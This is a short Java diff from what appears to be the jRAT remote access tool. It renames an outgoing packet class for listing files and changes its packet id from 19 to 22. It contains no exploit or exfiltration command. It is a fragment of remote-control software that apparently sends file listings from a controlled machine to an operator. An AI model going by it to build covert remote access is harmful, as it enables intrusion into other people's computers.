@@ -8,11 +8,11 @@ import java.util.Date;
 import se.jrat.common.io.StringWriter;
 
 
-public class Packet19ListFiles extends AbstractOutgoingPacket {
+public class Packet22ListFiles extends AbstractOutgoingPacket {
 
 	private File[] files;
 
-	public Packet19ListFiles(File[] files) {
+	public Packet22ListFiles(File[] files) {
 		this.files = files;
 	}
 
@@ -39,7 +39,7 @@ public class Packet19ListFiles extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return 19;
+		return 22;
 	}
 
 	public static String getDate(long date) {
